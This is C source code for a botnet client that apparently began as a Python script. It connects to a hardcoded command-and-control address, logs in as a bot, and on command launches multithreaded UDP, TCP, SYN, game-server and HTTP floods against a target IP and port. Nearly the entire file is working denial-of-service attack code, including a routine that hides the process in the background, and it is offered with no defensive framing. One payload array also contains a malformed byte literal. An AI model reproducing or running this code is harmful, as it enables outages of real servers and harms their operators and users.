#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>

// Configuration
#define C2_ADDRESS "185.194.177.247"
#define C2_PORT 6666

// Payloads
unsigned char payload_fivem[] = {0xff, 0xff, 0xff, 0xff, 'g', 'e', 't', 'i', 'n', 'f', 'o', ' ', 'x', 'x', 'x', 0x00, 0x00, 0x00};
unsigned char payload_vse[] = {0xff, 0xff, 0xff, 0xff, 0x54, 0x53, 0x6f, 0x75, 0x72, 0x63, 0x65, 0x20, 0x45, 0x6e, 0x67, 0x69, 0x6e, 0x65, 0x20, 0x51, 0x75, 0x65, 0x72, 0x79, 0x00};
unsigned char payload_mcpe[] = {0x61, 0x74, 0x6f, 0x6d, 0x20, 0x64, 0x61, 0x74, 0x61, 0x20, 0x6f, 0x6e, 0x74, 0x6f, 0x70, 0x20, 0x6d, 0x79, 0x20, 0x6f, 0x77, 0x6e, 0x20, 0x61, 0x73, 0x73, 0x20, 0x61, 0x6d, 0x70, 0x2f, 0x74, 0x72, 0x69, 0x70, 0x68, 0x65, 0x6e, 0x74, 0x20, 0x69, 0x73, 0x20, 0x6d, 0x79, 0x20, 0x64, 0x69, 0x63, 0x6b, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x62, 0x61, 0x6c, 0x6c\x73};
unsigned char payload_hex[] = {0x55, 0x55, 0x55, 0x55, 0x00, 0x00, 0x00, 0x01};

int PACKET_SIZES[] = {512, 1024, 2048};
int PACKET_SIZES_COUNT = sizeof(PACKET_SIZES) / sizeof(PACKET_SIZES[0]);

char* base_user_agents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9",
    "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko"
};
int base_user_agents_COUNT = sizeof(base_user_agents) / sizeof(base_user_agents[0]);

char* rand_ua() {
    return base_user_agents[rand() % base_user_agents_COUNT];
}

void daemonize() {
    pid_t pid;

    // Fork off the parent process
    pid = fork();
    if (pid < 0) {
        exit(EXIT_FAILURE);
    }
    // If we got a good PID, then we can exit the parent process.
    if (pid > 0) {
        exit(EXIT_SUCCESS);
    }

    // Change the file mode mask
    umask(0);

    // Create a new SID for the child process
    if (setsid() < 0) {
        exit(EXIT_FAILURE);
    }

    // Fork off the parent process again
    pid = fork();
    if (pid < 0) {
        exit(EXIT_FAILURE);
    }
    // If we got a good PID, then we can exit the parent process.
    if (pid > 0) {
        exit(EXIT_SUCCESS);
    }

    // Close out the standard file descriptors
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    // Redirect standard file descriptors to /dev/null
    int fd0 = open("/dev/null", O_RDWR);
    dup2(fd0, STDIN_FILENO);
    dup2(fd0, STDOUT_FILENO);
    dup2(fd0, STDERR_FILENO);
    if (fd0 > STDERR_FILENO) {
        close(fd0);
    }
}

// Structure to pass arguments to thread functions
typedef struct {
    char method[20]; // Assuming max method name length
    char ip[INET_ADDRSTRLEN]; // Max IP address string length
    int port;
    time_t secs; // End time (seconds since epoch)
} attack_args_t;

void* attack_fivem(void* args_ptr) {
    attack_args_t* args = (attack_args_t*)args_ptr;
    char* ip = args->ip;
    int port = args->port;
    time_t secs = args->secs;

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target_addr.sin_addr);

    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) {
        free(args);
        return NULL;
    }

    while (time(NULL) < secs) {
        sendto(s, payload_fivem, sizeof(payload_fivem), 0, (struct sockaddr*)&target_addr, sizeof(target_addr));
    }

    close(s);
    free(args);
    return NULL;
}

void* attack_mcpe(void* args_ptr) {
    attack_args_t* args = (attack_args_t*)args_ptr;
    char* ip = args->ip;
    int port = args->port;
    time_t secs = args->secs;

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target_addr.sin_addr);

    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) {
        free(args);
        return NULL;
    }

    while (time(NULL) < secs) {
        sendto(s, payload_mcpe, sizeof(payload_mcpe), 0, (struct sockaddr*)&target_addr, sizeof(target_addr));
    }

    close(s);
    free(args);
    return NULL;
}

void* attack_vse(void* args_ptr) {
    attack_args_t* args = (attack_args_t*)args_ptr;
    char* ip = args->ip;
    int port = args->port;
    time_t secs = args->secs;

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target_addr.sin_addr);

    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) {
        free(args);
        return NULL;
    }

    while (time(NULL) < secs) {
        sendto(s, payload_vse, sizeof(payload_vse), 0, (struct sockaddr*)&target_addr, sizeof(target_addr));
    }

    close(s);
    free(args);
    return NULL;
}

void* attack_hex(void* args_ptr) {
    attack_args_t* args = (attack_args_t*)args_ptr;
    char* ip = args->ip;
    int port = args->port;
    time_t secs = args->secs;

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target_addr.sin_addr);

    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) {
        free(args);
        return NULL;
    }

    while (time(NULL) < secs) {
        sendto(s, payload_hex, sizeof(payload_hex), 0, (struct sockaddr*)&target_addr, sizeof(target_addr));
    }

    close(s);
    free(args);
    return NULL;
}

void* attack_udp_bypass(void* args_ptr) {
    attack_args_t* args = (attack_args_t*)args_ptr;
    char* ip = args->ip;
    int port = args->port;
    time_t secs = args->secs;

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target_addr.sin_addr);

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        free(args);
        return NULL;
    }

    unsigned char packet[2048]; // Max packet size

    while (time(NULL) < secs) {
        int packet_size = PACKET_SIZES[rand() % PACKET_SIZES_COUNT];
        // Fill packet with random bytes
        for (int i = 0; i < packet_size; ++i) {
            packet[i] = rand() % 256;
        }
        sendto(sock, packet, packet_size, 0, (struct sockaddr*)&target_addr, sizeof(target_addr));
    }

    close(sock);
    free(args);
    return NULL;
}

void* attack_tcp_bypass(void* args_ptr) {
    attack_args_t* args = (attack_args_t*)args_ptr;
    char* ip = args->ip;
    int port = args->port;
    time_t secs = args->secs;

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target_addr.sin_addr);

    unsigned char packet[2048]; // Max packet size
    int packet_size = PACKET_SIZES[rand() % PACKET_SIZES_COUNT];
    // Fill packet with random bytes
    for (int i = 0; i < packet_size; ++i) {
        packet[i] = rand() % 256;
    }

    while (time(NULL) < secs) {
        int s = -1;
        // Python's try/except pass is replicated by checking return values
        // and continuing the loop on error.
        s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) {
            continue; // Replicate Python's pass
        }

        if (connect(s, (struct sockaddr*)&target_addr, sizeof(target_addr)) < 0) {
            close(s);
            continue; // Replicate Python's pass
        }

        // Python's inner while loop and try/except pass is replicated
        // by checking send return value and continuing the inner loop.
        while (time(NULL) < secs) {
            if (send(s, packet, packet_size, 0) < 0) {
                break; // Break inner loop on send error
            }
        }

        close(s); // Replicate Python's finally s.close()
    }

    free(args);
    return NULL;
}

void* attack_tcp_udp_bypass(void* args_ptr) {
    attack_args_t* args = (attack_args_t*)args_ptr;
    char* ip = args->ip;
    int port = args->port;
    time_t secs = args->secs;

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target_addr.sin_addr);

    while (time(NULL) < secs) {
        int s = -1;
        // Python's try/except pass is replicated by checking return values
        // and continuing the loop on error.
        try_block:; // Label for goto to replicate finally block

        int packet_size = PACKET_SIZES[rand() % PACKET_SIZES_COUNT];
        unsigned char packet[packet_size]; // Variable length array (C99)
        // Fill packet with random bytes
        for (int i = 0; i < packet_size; ++i) {
            packet[i] = rand() % 256;
        }

        if (rand() % 2 == 0) { // TCP
            s = socket(AF_INET, SOCK_STREAM, 0);
            if (s < 0) {
                goto finally_block; // Replicate Python's pass
            }
            if (connect(s, (struct sockaddr*)&target_addr, sizeof(target_addr)) < 0) {
                goto finally_block; // Replicate Python's pass
            }
            send(s, packet, packet_size, 0); // Python doesn't check send result here
        } else { // UDP
            s = socket(AF_INET, SOCK_DGRAM, 0);
            if (s < 0) {
                goto finally_block; // Replicate Python's pass
            }
            sendto(s, packet, packet_size, 0, (struct sockaddr*)&target_addr, sizeof(target_addr)); // Python doesn't check sendto result here
        }

        finally_block:; // Replicate Python's finally block
        if (s >= 0) {
            close(s); // Replicate Python's s.close()
        }
        // Python's inner try/except pass around s.close() is implicitly handled
        // by checking s >= 0 before closing.
    }

    free(args);
    return NULL;
}

void* attack_syn(void* args_ptr) {
    attack_args_t* args = (attack_args_t*)args_ptr;
    char* ip = args->ip;
    int port = args->port;
    time_t secs = args->secs;

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target_addr.sin_addr);

    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) {
        free(args);
        return NULL;
    }

    // Set socket to non-blocking
    int flags = fcntl(s, F_GETFL, 0);
    if (flags < 0) {
        close(s);
        free(args);
        return NULL;
    }
    if (fcntl(s, F_SETFL, flags | O_NONBLOCK) < 0) {
        close(s);
        free(args);
        return NULL;
    }

    // Attempt non-blocking connect
    // Python's try/except handles EINPROGRESS and immediate errors
    connect(s, (struct sockaddr*)&target_addr, sizeof(target_addr));
    // Ignore return value and errno here to replicate Python's immediate pass

    // Python's while loop and try/except pass is replicated
    // by checking send return value and continuing the loop.
    while (time(NULL) < secs) {
        int packet_size = PACKET_SIZES[rand() % PACKET_SIZES_COUNT];
        unsigned char packet[packet_size]; // Variable length array (C99)
        // Fill packet with random bytes
        for (int i = 0; i < packet_size; ++i) {
            packet[i] = rand() % 256;
        }
        // Send data on the non-blocking socket
        send(s, packet, packet_size, 0); // Python doesn't check send result here, just catches exception
        // We replicate by sending and ignoring the result/error
    }

    close(s); // Python's except block doesn't close, but the function ends.
              // We close the socket when the time is up.
    free(args);
    return NULL;
}

void* attack_http_get(void* args_ptr) {
    attack_args_t* args = (attack_args_t*)args_ptr;
    char* ip = args->ip;
    int port = args->port;
    time_t secs = args->secs;

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target_addr.sin_addr);

    char request[2048]; // Buffer for HTTP request

    while (time(NULL) < secs) {
        int s = -1;
        // Python's try/except pass is replicated by checking return values
        // and continuing the loop on error.
        s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) {
            continue; // Replicate Python's pass
        }

        if (connect(s, (struct sockaddr*)&target_addr, sizeof(target_addr)) < 0) {
            close(s); // Replicate Python's s.close() in except
            continue; // Replicate Python's pass
        }

        // Python's inner while loop and try/except pass is replicated
        // by checking send return value and continuing the inner loop.
        while (time(NULL) < secs) {
            snprintf(request, sizeof(request),
                     "GET / HTTP/1.1\r\n"
                     "Host: %s\r\n"
                     "User-Agent: %s\r\n"
                     "Connection: keep-alive\r\n\r\n",
                     ip, rand_ua());

            if (send(s, request, strlen(request), 0) < 0) {
                break; // Break inner loop on send error
            }
        }

        close(s); // Replicate Python's s.close() in except
    }

    free(args);
    return NULL;
}

void* attack_http_post(void* args_ptr) {
    attack_args_t* args = (attack_args_t*)args_ptr;
    char* ip = args->ip;
    int port = args->port;
    time_t secs = args->secs;

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target_addr.sin_addr);

    // The hex string payload as characters, as used in Python
    char* payload_str = "757365726e616d653d61646d696e2670617373776f72643d70617373776f726431323326656d61696c3d61646d696e406578616d706c652e636f6d267375626d69743d6c6f67696e";
    size_t payload_len = strlen(payload_str);

    char request[4096]; // Buffer for HTTP request + payload

    while (time(NULL) < secs) {
        int s = -1;
        // Python's try/except pass is replicated by checking return values
        // and continuing the loop on error.
        s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) {
            continue; // Replicate Python's pass
        }

        if (connect(s, (struct sockaddr*)&target_addr, sizeof(target_addr)) < 0) {
            close(s); // Replicate Python's s.close() in except
            continue; // Replicate Python's pass
        }

        // Python's inner while loop and try/except pass is replicated
        // by checking send return value and continuing the inner loop.
        while (time(NULL) < secs) {
            // Build the header string
            int header_len = snprintf(request, sizeof(request),
                                      "POST / HTTP/1.1\r\n"
                                      "Host: %s\r\n"
                                      "User-Agent: %s\r\n"
                                      "Content-Type: application/x-www-form-urlencoded\r\n"
                                      "Content-Length: %zu\r\n" // Use %zu for size_t
                                      "Connection: keep-alive\r\n\r\n",
                                      ip, rand_ua(), payload_len);

            // Append the payload string (characters)
            if (header_len < sizeof(request) - payload_len) {
                 memcpy(request + header_len, payload_str, payload_len + 1); // +1 for null terminator
            } else {
                 // Buffer too small, handle error or skip
                 close(s);
                 goto next_connection; // Break inner loop and continue outer
            }

            if (send(s, request, header_len + payload_len, 0) < 0) {
                break; // Break inner loop on send error
            }
        }

        close(s); // Replicate Python's s.close() in except
        next_connection:; // Label for goto
    }

    free(args);
    return NULL;
}

void* attack_browser(void* args_ptr) {
    attack_args_t* args = (attack_args_t*)args_ptr;
    char* ip = args->ip;
    int port = args->port;
    time_t secs = args->secs;

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target_addr.sin_addr);

    char request[2048]; // Buffer for HTTP request

    while (time(NULL) < secs) {
        int s = -1;
        // Python's try/except pass is replicated by checking return values
        // and continuing the loop on error.
        s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) {
            continue; // Replicate Python's pass
        }

        // Set socket timeout (5 seconds)
        struct timeval tv;
        tv.tv_sec = 5;
        tv.tv_usec = 0;
        setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
        setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof tv);

        if (connect(s, (struct sockaddr*)&target_addr, sizeof(target_addr)) < 0) {
            // Check for timeout error (EINPROGRESS followed by timeout) or other errors
            // Python's broad except handles all connect errors including timeout
            close(s);
            continue; // Replicate Python's pass
        }

        // Python's inner while loop is implicit in sendall
        // Python's try/except pass is replicated by checking sendall return value
        snprintf(request, sizeof(request),
                 "GET / HTTP/1.1\r\n"
                 "Host: %s\r\n"
                 "User-Agent: %s\r\n"
                 "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
                 "Accept-Encoding: gzip, deflate, br\r\n"
                 "Accept-Language: en-US,en;q=0.5\r\n"
                 "Connection: keep-alive\r\n"
                 "Upgrade-Insecure-Requests: 1\r\n"
                 "Cache-Control: max-age=0\r\n"
                 "Pragma: no-cache\r\n\r\n",
                 ip, rand_ua());

        // sendall in Python attempts to send the entire buffer.
        // In C, we loop send until all bytes are sent or error occurs.
        size_t total_sent = 0;
        size_t request_len = strlen(request);
        while (total_sent < request_len) {
            ssize_t sent_bytes = send(s, request + total_sent, request_len - total_sent, 0);
            if (sent_bytes < 0) {
                // Check for timeout or other errors
                // Python's broad except handles this
                break; // Break send loop on error
            }
            total_sent += sent_bytes;
        }

        close(s); // Replicate Python's finally s.close()
    }

    free(args);
    return NULL;
}


void* lunch_attack(void* args_ptr) {
    attack_args_t* args = (attack_args_t*)args_ptr;
    char* method = args->method;

    // Dispatch based on method string
    if (strcmp(method, ".HEX") == 0) {
        attack_hex(args_ptr);
    } else if (strcmp(method, ".UDP") == 0) {
        attack_udp_bypass(args_ptr);
    } else if (strcmp(method, ".TCP") == 0) {
        attack_tcp_bypass(args_ptr);
    } else if (strcmp(method, ".MIX") == 0) {
        attack_tcp_udp_bypass(args_ptr);
    } else if (strcmp(method, ".SYN") == 0) {
        attack_syn(args_ptr);
    } else if (strcmp(method, ".VSE") == 0) {
        attack_vse(args_ptr);
    } else if (strcmp(method, ".MCPE") == 0) {
        attack_mcpe(args_ptr);
    } else if (strcmp(method, ".FIVEM") == 0) {
        attack_fivem(args_ptr);
    } else if (strcmp(method, ".HTTPGET") == 0) {
        attack_http_get(args_ptr);
    } else if (strcmp(method, ".HTTPPOST") == 0) {
        attack_http_post(args_ptr);
    } else if (strcmp(method, ".BROWSER") == 0) {
        attack_browser(args_ptr);
    } else {
        // Method not found, free args
        free(args);
    }

    return NULL;
}

// Forward declaration for recursive call
void main_logic();

void main_logic() {
    int c2_sock = -1;
    struct sockaddr_in c2_addr;

    c2_addr.sin_family = AF_INET;
    c2_addr.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_ADDRESS, &c2_addr.sin_addr);

    // Python's outer while True loop for connection
    while (1) {
        // Python's try/except around connection
        c2_sock = socket(AF_INET, SOCK_STREAM, 0);
        if (c2_sock < 0) {
            sleep(120); // Replicate Python's time.sleep(120) on error
            continue;
        }

        // Set SO_KEEPALIVE
        int keepalive = 1;
        setsockopt(c2_sock, SOL_SOCKET, SO_KEEPALIVE, &keepalive, sizeof(keepalive));

        if (connect(c2_sock, (struct sockaddr*)&c2_addr, sizeof(c2_addr)) < 0) {
            close(c2_sock);
            sleep(120); // Replicate Python's time.sleep(120) on error
            continue;
        }

        printf("connected!\n"); // Replicate Python's print

        // Authentication loop 1: Username
        while (1) {
            char buffer[1024];
            ssize_t bytes_received = recv(c2_sock, buffer, sizeof(buffer) - 1, 0);
            if (bytes_received <= 0) {
                // Error or disconnect
                close(c2_sock);
                sleep(120); // Replicate Python's time.sleep(120) on error
                goto reconnect; // Break outer loop and try reconnecting
            }
            buffer[bytes_received] = '\0'; // Null-terminate

            // Python's 'Username' in data check
            if (strstr(buffer, "Username") != NULL) {
                send(c2_sock, "BOT", 3, 0); // Python's c2.send('BOT'.encode())
                break; // Break inner auth loop
            }
        }

        // Authentication loop 2: Password
        while (1) {
            char buffer[1024];
            ssize_t bytes_received = recv(c2_sock, buffer, sizeof(buffer) - 1, 0);
            if (bytes_received <= 0) {
                // Error or disconnect
                close(c2_sock);
                sleep(120); // Replicate Python's time.sleep(120) on error
                goto reconnect; // Break outer loop and try reconnecting
            }
            buffer[bytes_received] = '\0'; // Null-terminate

            // Python's 'Password' in data check
            if (strstr(buffer, "Password") != NULL) {
                // Python's c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                unsigned char password_payload[] = {0xff, 0xff, 0xff, 0xff, 0x75};
                send(c2_sock, password_payload, sizeof(password_payload), 0);
                break; // Break inner auth loop
            }
        }

        // Authentication successful, break outer connection loop
        break;

        reconnect:; // Label for goto
    }

    // Main command processing loop
    // Python's while True loop
    while (1) {
        char buffer[1024];
        ssize_t bytes_received = recv(c2_sock, buffer, sizeof(buffer) - 1, 0);

        // Python's try/except around command processing
        if (bytes_received <= 0) {
            // Error or disconnect (Python's if not data: break)
            break; // Break command processing loop
        }
        buffer[bytes_received] = '\0'; // Null-terminate

        // Python's strip()
        char* data = buffer;
        // Trim leading whitespace
        while (*data && (*data == ' ' || *data == '\t' || *data == '\n' || *data == '\r')) {
            data++;
        }
        // Trim trailing whitespace
        char* end = data + strlen(data) - 1;
        while (end >= data && (*end == ' ' || *end == '\t' || *end == '\n' || *end == '\r')) {
            *end = '\0';
            end--;
        }

        // Python's data.split(' ')
        char* args[6]; // Max 6 arguments expected (COMMAND IP PORT SECS THREADS) + safety
        int arg_count = 0;
        char* token = strtok(data, " ");
        while (token != NULL && arg_count < 6) {
            args[arg_count++] = token;
            token = strtok(NULL, " ");
        }

        if (arg_count == 0) {
            continue; // Empty command
        }

        char command[20]; // Buffer for uppercase command
        strncpy(command, args[0], sizeof(command) - 1);
        command[sizeof(command) - 1] = '\0';
        // Convert command to uppercase
        for (int i = 0; command[i]; i++) {
            if (command[i] >= 'a' && command[i] <= 'z') {
                command[i] = command[i] - ('a' - 'A');
            }
        }

        // Python's if command == 'PING':
        if (strcmp(command, "PING") == 0) {
            send(c2_sock, "PONG", 4, 0); // Python's c2.send('PONG'.encode())
        } else if (arg_count >= 5) { // Expecting at least 5 args for attack commands
            // Python's else block for attack commands
            char* method = args[0]; // Use original case for method lookup
            char* ip = args[1];
            int port = atoi(args[2]);
            int duration = atoi(args[3]);
            time_t secs = time(NULL) + duration; // Calculate end time
            int threads = atoi(args[4]);

            // Python's for _ in range(threads):
            for (int i = 0; i < threads; ++i) {
                // Prepare arguments for the thread
                attack_args_t* thread_args = (attack_args_t*)malloc(sizeof(attack_args_t));
                if (thread_args == NULL) {
                    // Handle malloc error, skip thread creation
                    continue;
                }
                strncpy(thread_args->method, method, sizeof(thread_args->method) - 1);
                thread_args->method[sizeof(thread_args->method) - 1] = '\0';
                strncpy(thread_args->ip, ip, sizeof(thread_args->ip) - 1);
                thread_args->ip[sizeof(thread_args->ip) - 1] = '\0';
                thread_args->port = port;
                thread_args->secs = secs;

                pthread_t tid;
                // Python's threading.Thread(target=lunch_attack, args=(...), daemon=True).start()
                // In C, we create a thread and detach it (default behavior if not joined)
                // or explicitly detach. Not calling pthread_join replicates daemon=True.
                if (pthread_create(&tid, NULL, lunch_attack, thread_args) != 0) {
                    // Handle thread creation error
                    free(thread_args); // Free args if thread creation fails
                } else {
                    // Optionally detach the thread if not joining
                    pthread_detach(tid);
                }
            }
        }
        // Python's broad except around command processing loop is handled by the initial recv check
    }

    // Python's c2.close()
    close(c2_sock);

    // Python's main() recursive call
    main_logic();
}

int main() {
    // Seed random number generator
    srand(time(NULL));

    // Python's if __name__ == '__main__': try/except pass
    // We call the main logic function. Any unhandled errors would terminate.
    // Daemonize first if desired (uncomment the line below)
    // daemonize();

    main_logic();

    return 0; // Should not be reached due to recursive main_logic call
}
